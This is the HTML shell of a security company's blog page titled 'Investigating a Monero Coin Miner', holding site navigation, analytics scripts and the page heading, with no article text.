<!doctype html><!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en" > <![endif]--><!--[if IE 7]>    <html class="no-js lt-ie9 lt-ie8" lang="en" >        <![endif]--><!--[if IE 8]>    <html class="no-js lt-ie9" lang="en" >               <![endif]--><!--[if gt IE 8]><!--><html class="no-js" lang="en"><!--<![endif]--><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="author" content="Triskele Labs">
    <meta name="description" content="Using public and open source tools to investigate a coin miner that was encountered during a Digital Forensics and Incident Response (DFIR) investigation">
    <meta name="generator" content="HubSpot">
    <title>Investigating Monero Coin Miner</title>
    <link rel="shortcut icon" href="https://www.triskelelabs.com/hubfs/TL_icon-1.svg">

<meta name="viewport" content="width=device-width, initial-scale=1">

    
    <meta property="og:description" content="Using public and open source tools to investigate a coin miner that was encountered during a Digital Forensics and Incident Response (DFIR) investigation">
    <meta property="og:title" content="Investigating Monero Coin Miner">
    <meta name="twitter:description" content="Using public and open source tools to investigate a coin miner that was encountered during a Digital Forensics and Incident Response (DFIR) investigation">
    <meta name="twitter:title" content="Investigating Monero Coin Miner">

    

    
    <style>
a.cta_button{-moz-box-sizing:content-box !important;-webkit-box-sizing:content-box !important;box-sizing:content-box !important;vertical-align:middle}.hs-breadcrumb-menu{list-style-type:none;margin:0px 0px 0px 0px;padding:0px 0px 0px 0px}.hs-breadcrumb-menu-item{float:left;padding:10px 0px 10px 10px}.hs-breadcrumb-menu-divider:before{content:'›';padding-left:10px}.hs-featured-image-link{border:0}.hs-featured-image{float:right;margin:0 0 20px 20px;max-width:50%}@media (max-width: 568px){.hs-featured-image{float:none;margin:0;width:100%;max-width:100%}}.hs-screen-reader-text{clip:rect(1px, 1px, 1px, 1px);height:1px;overflow:hidden;position:absolute !important;width:1px}
</style>

<link rel="stylesheet" href="https://www.triskelelabs.com/hs-fs/hub/19911083/hub_generated/template_assets/52805218911/1656929268728/triskele_labs_theme_2021/assets/vars.min.css">
<link rel="stylesheet" href="https://www.triskelelabs.com/hs-fs/hub/19911083/hub_generated/template_assets/58246040179/1656583717000/triskele_labs_theme_2021/assets/fonts.min.css">
<link rel="stylesheet" href="https://www.triskelelabs.com/hs-fs/hub/19911083/hub_generated/template_assets/52806010379/1724179810734/triskele_labs_theme_2021/assets/bundle.min.css">
<style>
  @font-face {
    font-family: "Roboto Mono";
    font-weight: 400;
    font-style: normal;
    font-display: swap;
    src: url("/_hcms/googlefonts/Roboto_Mono/regular.woff2") format("woff2"), url("/_hcms/googlefonts/Roboto_Mono/regular.woff") format("woff");
  }
  @font-face {
    font-family: "Open Sans";
    font-weight: 400;
    font-style: normal;
    font-display: swap;
    src: url("/_hcms/googlefonts/Open_Sans/regular.woff2") format("woff2"), url("/_hcms/googlefonts/Open_Sans/regular.woff") format("woff");
  }
  @font-face {
    font-family: "Nunito Sans";
    font-weight: 800;
    font-style: normal;
    font-display: swap;
    src: url("/_hcms/googlefonts/Nunito_Sans/800.woff2") format("woff2"), url("/_hcms/googlefonts/Nunito_Sans/800.woff") format("woff");
  }
  @font-face {
    font-family: "Nunito Sans";
    font-weight: 600;
    font-style: normal;
    font-display: swap;
    src: url("/_hcms/googlefonts/Nunito_Sans/600.woff2") format("woff2"), url("/_hcms/googlefonts/Nunito_Sans/600.woff") format("woff");
  }
  @font-face {
    font-family: "Nunito Sans";
    font-weight: 400;
    font-style: normal;
    font-display: swap;
    src: url("/_hcms/googlefonts/Nunito_Sans/regular.woff2") format("woff2"), url("/_hcms/googlefonts/Nunito_Sans/regular.woff") format("woff");
  }
  @font-face {
    font-family: "Nunito Sans";
    font-weight: 700;
    font-style: normal;
    font-display: swap;
    src: url("/_hcms/googlefonts/Nunito_Sans/700.woff2") format("woff2"), url("/_hcms/googlefonts/Nunito_Sans/700.woff") format("woff");
  }
</style>

    

    
<!--  Added by GoogleAnalytics integration -->
<script>
var _hsp = window._hsp = window._hsp || [];
_hsp.push(['addPrivacyConsentListener', function(consent) { if (consent.allowed || (consent.categories && consent.categories.analytics)) {
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create','UA-125432636-1','auto');
  ga('send','pageview');
}}]);
</script>

<!-- /Added by GoogleAnalytics integration -->

<!--  Added by GoogleTagManager integration -->
<script>
var _hsp = window._hsp = window._hsp || [];
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}

var useGoogleConsentModeV2 = true;
var waitForUpdateMillis = 1000;



var hsLoadGtm = function loadGtm() {
    if(window._hsGtmLoadOnce) {
      return;
    }

    if (useGoogleConsentModeV2) {

      gtag('set','developer_id.dZTQ1Zm',true);

      gtag('consent', 'default', {
      'ad_storage': 'denied',
      'analytics_storage': 'denied',
      'ad_user_data': 'denied',
      'ad_personalization': 'denied',
      'wait_for_update': waitForUpdateMillis
      });

      _hsp.push(['useGoogleConsentModeV2'])
    }

    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-TCMKGXF');

    window._hsGtmLoadOnce = true;
};

_hsp.push(['addPrivacyConsentListener', function(consent){
  if(consent.allowed || (consent.categories && consent.categories.analytics)){
    hsLoadGtm();
  }
}]);

</script>

<!-- /Added by GoogleTagManager integration -->

    <link rel="canonical" href="https://www.triskelelabs.com/investigating-monero-coin-miner">


<meta property="og:image" content="https://www.triskelelabs.com/hubfs/Hero_CyberWonderland_Monero%20Coin%20Miner.png">
<meta property="og:image:width" content="1900">
<meta property="og:image:height" content="900">

<meta name="twitter:image" content="https://www.triskelelabs.com/hubfs/Hero_CyberWonderland_Monero%20Coin%20Miner.png">


<meta property="og:url" content="https://www.triskelelabs.com/investigating-monero-coin-miner">
<meta name="twitter:card" content="summary_large_image">
<meta http-equiv="content-language" content="en">






    <style>
  pre{
    white-space: pre-wrap;
  }
  
  code {
    display: block;
    font-family: monospace;
    background: #eeeeee;
    font-size:12px;
    padding: 20px;
    margin: 30px 20px;
    word-break: break-all;
    word-wrap: break-word;
    overflow-wrap: anywhere;
  }
  
  code.inline {
    display: inline;
    padding: 3px 10px;
    color: #eb5757;
    margin: 0px;
    word-break: normal;
    word-wrap: normal;
    overflow-wrap: normal;
  }
</style>
      
</head>
<body class="   hs-content-id-78942196274 hs-site-page page " style="">
<!--  Added by GoogleTagManager integration -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TCMKGXF" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>

<!-- /Added by GoogleTagManager integration -->

    <div class="header-container-wrapper">
    <div class="header-container container-fluid">

<div class="row-fluid-wrapper row-depth-1 row-number-1 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_1605857630400886" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">









<header class="gp-header gp-header_dark gp-header_with-items" style="border-bottom: 1px solid #4f4f4f">
  <div class="gp-header__fade gp-header__fade_bg-two"></div>
  <div class="gp-header__container">
    <div class="gp-header__row">
      <div class="gp-header__col gp-header__col_logo">
        <a href="/?hsLang=en" class="gp-header__logoLink">
          
            <img class="gp-header__logo" src="https://www.triskelelabs.com/hubfs/Logo%20White.svg" alt="Logo White">
          
        </a>
      </div>
      <nav class="gp-header__col gp-header__col_menu">
        <ul class="gp-header__menu">
          
            <li class="gp-header__menuItem">
              <a class="gp-header__menuLink gp-header__menuLink_light gp-header__menuLink-mob_light" href="https://www.triskelelabs.com/solutions?hsLang=en">Experience</a>
              
            </li>
          
            <li class="gp-header__menuItem gp-header__menuItem_large">
              <a class="gp-header__menuLink gp-header__menuLink_light gp-header__menuLink-mob_light gp-header__menuLink_dropdown gp-header__menuLink_dropdown_large" href="#">Solutions</a>
              
                <ul class="gp-header__menuDropdown gp-header__menuDropdown_bg-two gp-header__menuDropdown_Lg gp-header__menuDropdown_LgMenu_light">
                  
                    <div class="gp-header__megaDropdown">
                      
                      
                      <a href="https://www.triskelelabs.com/advisory?hsLang=en" class="gp-header__megaDropdownName">
                        <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/Advisory-1.svg)"></div>
                        Advisory
                      </a>
                      <div class="gp-header__megaDropdownSubgroups">
                        
                        <div class="gp-header__megaDropdownSubgroup">
                          
                          
                          <a href="https://www.triskelelabs.com/cyber-governance?hsLang=en" class="gp-header__megaDropdownSubName gp-header__megaDropdownSubName_sub gp-header__megaDropdownSubName_link">
                            
                              <div class="gp-header__megaDropdownSubPlus"></div>
                            
                            <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/Cyber%20Strategy-1.svg)"></div>
                            Cyber Governance
                          </a>
                          <span id="hs_cos_wrapper_module_1605857630400886_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="simple_menu"><div id="hs_menu_wrapper_module_1605857630400886_" class="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal" role="navigation" data-sitemap-name="" data-menu-id="" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/cyber-governance#go" role="menuitem" target="_self">Security Strategy</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/cyber-governance#go" role="menuitem" target="_self">Security Roadmap</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/cyber-governance#go" role="menuitem" target="_self">Executive Reporting</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/cyber-governance#go" role="menuitem" target="_self">Critical Infrastructure Reviews</a></li>
 </ul>
</div></span>
                        </div>
                        
                        <div class="gp-header__megaDropdownSubgroup">
                          
                          
                          <a href="https://www.triskelelabs.com/risk-management?hsLang=en" class="gp-header__megaDropdownSubName gp-header__megaDropdownSubName_sub gp-header__megaDropdownSubName_link">
                            
                              <div class="gp-header__megaDropdownSubPlus"></div>
                            
                            <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/Risk%20Management.svg)"></div>
                            Risk Management
                          </a>
                          <span id="hs_cos_wrapper_module_1605857630400886_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="simple_menu"><div id="hs_menu_wrapper_module_1605857630400886_" class="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal" role="navigation" data-sitemap-name="" data-menu-id="" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/risk-management#1" role="menuitem" target="_self">Internal Risk Assessments</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/risk-management#2" role="menuitem" target="_self">Third Party Risk Assessments</a></li>
 </ul>
</div></span>
                        </div>
                        
                        <div class="gp-header__megaDropdownSubgroup">
                          
                          
                          <a href="https://www.triskelelabs.com/compliance-services?hsLang=en" class="gp-header__megaDropdownSubName gp-header__megaDropdownSubName_sub gp-header__megaDropdownSubName_link">
                            
                              <div class="gp-header__megaDropdownSubPlus"></div>
                            
                            <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/Compliance%20Services-1.svg)"></div>
                            Compliance Services
                          </a>
                          <span id="hs_cos_wrapper_module_1605857630400886_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="simple_menu"><div id="hs_menu_wrapper_module_1605857630400886_" class="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal" role="navigation" data-sitemap-name="" data-menu-id="" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/compliance-services#go" role="menuitem" target="_self">PCI Compliance</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/compliance-services#go" role="menuitem" target="_self">CPS234 Audits</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/compliance-services#go" role="menuitem" target="_self">ISO27001 Compliance</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/compliance-services#go" role="menuitem" target="_self">Policy Frameworks</a></li>
 </ul>
</div></span>
                        </div>
                        
                        <div class="gp-header__megaDropdownSubgroup">
                          
                          
                          <a href="https://www.triskelelabs.com/security-as-a-service?hsLang=en" class="gp-header__megaDropdownSubName gp-header__megaDropdownSubName_sub gp-header__megaDropdownSubName_link">
                            
                              <div class="gp-header__megaDropdownSubPlus"></div>
                            
                            <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/Security-as-a-Service.svg)"></div>
                            Security-as-a-Service
                          </a>
                          <span id="hs_cos_wrapper_module_1605857630400886_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="simple_menu"><div id="hs_menu_wrapper_module_1605857630400886_" class="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal" role="navigation" data-sitemap-name="" data-menu-id="" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/security-as-a-service#1" role="menuitem" target="_self">Virtual Chief Information Security Officer (CISO)</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/security-as-a-service#2" role="menuitem" target="_self">Virtual Security Team</a></li>
 </ul>
</div></span>
                        </div>
                        
                      </div>
                    </div>
                  
                    <div class="gp-header__megaDropdown">
                      
                      
                      <a href="https://www.triskelelabs.com/defensive?hsLang=en" class="gp-header__megaDropdownName">
                        <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/Defensive.svg)"></div>
                        Defensive
                      </a>
                      <div class="gp-header__megaDropdownSubgroups">
                        
                        <div class="gp-header__megaDropdownSubgroup">
                          
                          
                          <a href="https://www.triskelelabs.com/managed-detection-and-response?hsLang=en" class="gp-header__megaDropdownSubName gp-header__megaDropdownSubName_sub gp-header__megaDropdownSubName_link">
                            
                              <div class="gp-header__megaDropdownSubPlus"></div>
                            
                            <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/Defence%20Shield%2024x7x365.svg)"></div>
                            Managed Detection and Response (DefenceShield) 
                          </a>
                          <span id="hs_cos_wrapper_module_1605857630400886_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="simple_menu"><div id="hs_menu_wrapper_module_1605857630400886_" class="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal" role="navigation" data-sitemap-name="" data-menu-id="" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/managed-detection-and-response#go" role="menuitem" target="_self">DefenceShield Monitor</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/managed-detection-and-response#go" role="menuitem" target="_self">DefenceShield Assess</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/managed-detection-and-response#go" role="menuitem" target="_self">DefenceShield Advanced</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/managed-detection-and-response#go" role="menuitem" target="_self">DefenceShield Hunt</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/managed-detection-and-response#go" role="menuitem" target="_self">DefenceShield Infiltrate</a></li>
 </ul>
</div></span>
                        </div>
                        
                        <div class="gp-header__megaDropdownSubgroup">
                          
                          
                          <a href="https://www.triskelelabs.com/24x7x365-incident-response?hsLang=en" class="gp-header__megaDropdownSubName gp-header__megaDropdownSubName_link">
                            
                            <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/24x7x365%20Incident%20Response.svg)"></div>
                            24x7x365 Incident Response
                          </a>
                          
                        </div>
                        
                        <div class="gp-header__megaDropdownSubgroup">
                          
                          
                          <a href="https://www.triskelelabs.com/engineering?hsLang=en" class="gp-header__megaDropdownSubName gp-header__megaDropdownSubName_sub gp-header__megaDropdownSubName_link">
                            
                              <div class="gp-header__megaDropdownSubPlus"></div>
                            
                            <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/Engineering.svg)"></div>
                            Engineering
                          </a>
                          <span id="hs_cos_wrapper_module_1605857630400886_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="simple_menu"><div id="hs_menu_wrapper_module_1605857630400886_" class="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal" role="navigation" data-sitemap-name="" data-menu-id="" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/engineering#go" role="menuitem" target="_self">Deployments &amp; Uplift</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/engineering#go" role="menuitem" target="_self">Security Configuration Reviews</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/engineering#go" role="menuitem" target="_self">Controls Testing</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/engineering#go" role="menuitem" target="_self">Incident Response Testing</a></li>
 </ul>
</div></span>
                        </div>
                        
                        <div class="gp-header__megaDropdownSubgroup">
                          
                          
                          <a href="https://www.triskelelabs.com/simulated-phishing?hsLang=en" class="gp-header__megaDropdownSubName gp-header__megaDropdownSubName_link">
                            
                            <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/PhishAway.svg)"></div>
                            Simulated Phishing
                          </a>
                          
                        </div>
                        
                        <div class="gp-header__megaDropdownSubgroup">
                          
                          
                          <a href="https://www.triskelelabs.com/cyber-threat-intelligence?hsLang=en" class="gp-header__megaDropdownSubName gp-header__megaDropdownSubName_link">
                            
                            <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Threat%20Intelligence.svg)"></div>
                            Cyber Threat Intelligence
                          </a>
                          
                        </div>
                        
                      </div>
                    </div>
                  
                    <div class="gp-header__megaDropdown">
                      
                      
                      <a href="https://www.triskelelabs.com/offensive?hsLang=en" class="gp-header__megaDropdownName">
                        <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/Offensive.svg)"></div>
                        Offensive
                      </a>
                      <div class="gp-header__megaDropdownSubgroups">
                        
                        <div class="gp-header__megaDropdownSubgroup">
                          
                          
                          <a href="https://www.triskelelabs.com/penetration-testing?hsLang=en" class="gp-header__megaDropdownSubName gp-header__megaDropdownSubName_sub gp-header__megaDropdownSubName_link">
                            
                              <div class="gp-header__megaDropdownSubPlus"></div>
                            
                            <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/Penetration%20Testing.svg)"></div>
                            Penetration Testing
                          </a>
                          <span id="hs_cos_wrapper_module_1605857630400886_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="simple_menu"><div id="hs_menu_wrapper_module_1605857630400886_" class="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal" role="navigation" data-sitemap-name="" data-menu-id="" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/penetration-testing#go" role="menuitem" target="_self">Web Applications</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/penetration-testing#go" role="menuitem" target="_self">Mobile Applications</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/penetration-testing#go" role="menuitem" target="_self">Internal Networks</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/penetration-testing#go" role="menuitem" target="_self">External Networks</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/penetration-testing#go" role="menuitem" target="_self">Wireless Networks</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.triskelelabs.com/penetration-testing#go" role="menuitem" target="_self">Hardware and IoT</a></li>
 </ul>
</div></span>
                        </div>
                        
                        <div class="gp-header__megaDropdownSubgroup">
                          
                          
                          <a href="https://www.triskelelabs.com/secure-code-review?hsLang=en" class="gp-header__megaDropdownSubName gp-header__megaDropdownSubName_link">
                            
                            <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/Secure%20Code%20Review.svg)"></div>
                            Secure Code Review
                          </a>
                          
                        </div>
                        
                        <div class="gp-header__megaDropdownSubgroup">
                          
                          
                          <a href="https://www.triskelelabs.com/red-teaming-attack-simulation?hsLang=en" class="gp-header__megaDropdownSubName gp-header__megaDropdownSubName_link">
                            
                            <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/Red%20Teaming%20&amp;%20Attack%20Simulation.svg)"></div>
                            Red Teaming &amp; Attack Simulation 
                          </a>
                          
                        </div>
                        
                        <div class="gp-header__megaDropdownSubgroup">
                          
                          
                          <a href="https://www.triskelelabs.com/corie?hsLang=en" class="gp-header__megaDropdownSubName gp-header__megaDropdownSubName_link">
                            
                            <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/Services%20Icons/CORIE.svg)"></div>
                            CORIE
                          </a>
                          
                        </div>
                        
                      </div>
                    </div>
                  
                    <div class="gp-header__megaDropdown">
                      
                      
                      <a href="https://www.triskelelabs.com/cyber-security-recruitment?hsLang=en" class="gp-header__megaDropdownName" target="_blank">
                        <div class="gp-header__megaDropdownIcon" style="background-image: url(https://www.triskelelabs.com/hubfs/TL%20Recruitment%20Service.png)"></div>
                        Recruitment
                      </a>
                      <div class="gp-header__megaDropdownSubgroups">
                        
                      </div>
                    </div>
                  
                </ul>
              
            </li>
          
            <li class="gp-header__menuItem">
              <a class="gp-header__menuLink gp-header__menuLink_light gp-header__menuLink-mob_light gp-header__menuLink_dropdown" href="#">Resources</a>
              
                <ul class="gp-header__menuDropdown gp-header__menuDropdown_bg-two">
                  
                    <li class="gp-header__menuDropdownItem">
                      
                      
                      <a href="https://www.triskelelabs.com/blog?hsLang=en" class="gp-header__menuDropdownLink gp-header__menuDropdownLink_light">
                      Blog</a>
                    </li>
                  
                    <li class="gp-header__menuDropdownItem">
                      
                      
                      <a href="https://www.triskelelabs.com/cyber-wonderland?hsLang=en" class="gp-header__menuDropdownLink gp-header__menuDropdownLink_light">
                      Cyber Wonderland</a>
                    </li>
                  
                    <li class="gp-header__menuDropdownItem">
                      
                      
                      <a href="https://www.triskelelabs.com/cybeers?hsLang=en" class="gp-header__menuDropdownLink gp-header__menuDropdownLink_light">
                      Cybeers Web Series</a>
                    </li>
                  
                    <li class="gp-header__menuDropdownItem">
                      
                      
                      <a href="https://www.triskelelabs.com/database-consultants-australia-case-study?hsLang=en" class="gp-header__menuDropdownLink gp-header__menuDropdownLink_light" target="_blank">
                      Customer Stories</a>
                    </li>
                  
                </ul>
              
            </li>
          
            <li class="gp-header__menuItem">
              <a class="gp-header__menuLink gp-header__menuLink_light gp-header__menuLink-mob_light gp-header__menuLink_dropdown" href="#">About</a>
              
                <ul class="gp-header__menuDropdown gp-header__menuDropdown_bg-two">
                  
                    <li class="gp-header__menuDropdownItem">
                      
                      
                      <a href="https://www.triskelelabs.com/about?hsLang=en" class="gp-header__menuDropdownLink gp-header__menuDropdownLink_light">
                      Meet Triskele Labs</a>
                    </li>
                  
                    <li class="gp-header__menuDropdownItem">
                      
                      
                      <a href="https://www.triskelelabs.com/team?hsLang=en" class="gp-header__menuDropdownLink gp-header__menuDropdownLink_light">
                      Meet the Team</a>
                    </li>
                  
                    <li class="gp-header__menuDropdownItem">
                      
                      
                      <a href="https://apply.workable.com/triskele-labs/#jobs" class="gp-header__menuDropdownLink gp-header__menuDropdownLink_light" target="_blank">
                      Careers</a>
                    </li>
                  
                    <li class="gp-header__menuDropdownItem">
                      
                      
                      <a href="https://www.triskelelabs.com/partners?hsLang=en" class="gp-header__menuDropdownLink gp-header__menuDropdownLink_light">
                      Partners</a>
                    </li>
                  
                    <li class="gp-header__menuDropdownItem">
                      
                      
                      <a href="https://www.triskelelabs.com/certifications?hsLang=en" class="gp-header__menuDropdownLink gp-header__menuDropdownLink_light">
                      Certifications</a>
                    </li>
                  
                </ul>
              
            </li>
          
        </ul>
        <div class="gp-header__ctas gp-header__ctas_mobile">
          
            <a class="gp-header__phone" href="tel:13002429237">
              <div class="gp-header__phone-icon"></div>
              <div class="gp-header__phone-number">1300 24 Cyber</div>
            </a>
          
          
            
            
            <a href="https://www.triskelelabs.com/contact?hsLang=en" class="gp-header__cta gp-header__cta_primary">
            Get in touch</a>
          
        </div>
      </nav>
      <div class="gp-header__nav">
        <a href="#" class="gp-header__search-icon"></a>
        <div class="gp-header__search">
          <div class="gp-header__search-fade"></div>
          <div class="gp-header__search-container">
            <div class="gp-header__search-row">
              <div class="gp-header__search-col">
                <form action="/hs-search-results" class="gp-header__search-form">
                  <input type="text" class="gp-header__search-input" name="term" autocomplete="off" aria-label="Search" placeholder="Type your search query">

                  
                  
                  
                  

                  <button class="gp-header__search-button" aria-label="Search"></button>
                </form>
              </div>
            </div>
          </div>
        </div>
        <a href="#" class="gp-header__hamburger"></a>
      </div>
      <div class="gp-header__col gp-header__col_cta">
        
          <a class="gp-header__phone" href="tel:13002429237">
            <div class="gp-header__phone-icon"></div>
            <div class="gp-header__phone-number">1300 24 Cyber</div>
          </a>
        
        <div class="gp-header__ctas">
          
            
            
            <a href="https://www.triskelelabs.com/contact?hsLang=en" class="gp-header__cta gp-header__cta_primary">
              Get in touch
            </a>
          
        </div>
      </div>
    </div>
  </div>
</header>

</div>

<div class="container-fluid">
<div class="row-fluid-wrapper">
<div class="row-fluid">
<div class="span12 widget-span widget-type-cell " style="" data-widget-type="cell" data-x="0" data-w="12">

</div><!--end widget-span -->
</div>
</div>
</div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

    </div><!--end header -->
</div><!--end header wrapper -->

<div class="body-container-wrapper">
    <div class="body-container container-fluid">

<div class="row-fluid-wrapper row-depth-1 row-number-1 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-widget_container test" style="" data-widget-type="widget_container" data-x="0" data-w="12">
<div class="container-fluid">
<div class="row-fluid-wrapper">
<div class="row-fluid">
<div class="span12 widget-span widget-type-cell " style="" data-widget-type="cell" data-x="0" data-w="12">

<div class="row-fluid-wrapper row-depth-1 row-number-1 dnd-section">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-cell dnd-column" style="" data-widget-type="cell" data-x="0" data-w="12">

<div class="row-fluid-wrapper row-depth-1 row-number-2 dnd-row">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget dnd-module" style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_widget_1630618936679" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">




<div id="" class="gp-block gp-block_paddings- gp-block_bg-two gp-block_text-dark gp-heroRich
             
             " style="
      
      
        background-image: url(https://www.triskelelabs.com/hubfs/Hero_CyberWonderland_Monero%20Coin%20Miner.png);
        
      ">
  
  
  
  <div class="gp-block__wrapper">
    






<div class="gp-heroRich__wrp gp-heroRich__wrp_large" data-slidetime="600" data-lastslidetime="1800" data-lettertime="63">
    
  <div class="gp-heroRich__container">
    <div class="gp-heroRich__row">
    
          <div class="gp-heroRich__col gp-heroRich__col_textWide">
            
  
  
    <h6 class="gp-heroRich__caption gp-heroRich__caption_light">Triskele Labs Cyber Wonderland</h6>
  
  
    <h1 class="gp-heroRich__title gp-heroRich__title_light">
    Investigating a Monero Coin Miner
      
    </h1>
  
  
  
  

          </div>
        
    </div>
  </div>
</div>


  </div>
</div>
</div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

